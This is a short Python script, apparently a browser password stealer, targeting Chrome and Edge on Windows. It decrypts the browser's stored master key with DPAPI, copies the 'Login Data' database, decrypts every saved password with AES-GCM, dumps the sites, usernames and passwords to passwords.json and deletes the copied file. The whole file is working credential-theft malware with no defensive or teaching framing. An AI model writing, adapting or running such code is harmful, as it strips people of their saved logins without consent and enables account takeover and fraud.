import base64
import os
import json
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from typing import Literal


CHROME_PATH = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
EDGE_PATH = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data')

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def get_key(key_path:str):
    with open(key_path, 'r') as f:
        content = f.read()
        local_state = json.loads(content)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = win32crypt.CryptUnprotectData(key[5:], None, None, None, 0)[1]
    return key


def decrypt_password(ciphertext: str, key):
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:-16]
    cipher = generate_cipher(key, initialisation_vector)
    decrypted_pass = decrypt_payload(cipher, encrypted_password)
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

def steal_passwords(browser: Literal['Chrome', 'Edge']):
    database_path = os.path.join(CHROME_PATH, 'Default', 'Login Data') \
        if browser == 'Chrome' else os.path.join(EDGE_PATH, 'Default', 'Login Data')
    key_path = os.path.join(CHROME_PATH, 'Local State') \
        if browser == 'Chrome' else os.path.join(EDGE_PATH, 'Local State')
    key = get_key(key_path)
    os.system(f'copy "{database_path}" .')
    conn = sqlite3.connect('Login Data')
    c = conn.cursor()
    c.execute('SELECT action_url, username_value, password_value FROM logins')
    values = c.fetchall()
    login_info = []
    for val in values:
        if not val[0]:
            continue
        ciphertext = val[2]
        password = decrypt_password(ciphertext, key)
        login_info.append({'website': [val[0]], 'username': [val[1]], 'password': [password]})
    conn.close()
    with open('passwords.json', 'w') as f:
        json.dump(login_info, f, indent=4)
    os.system('del "Login Data"')
    return login_info

if __name__ == '__main__':
    print(steal_passwords('Edge'))
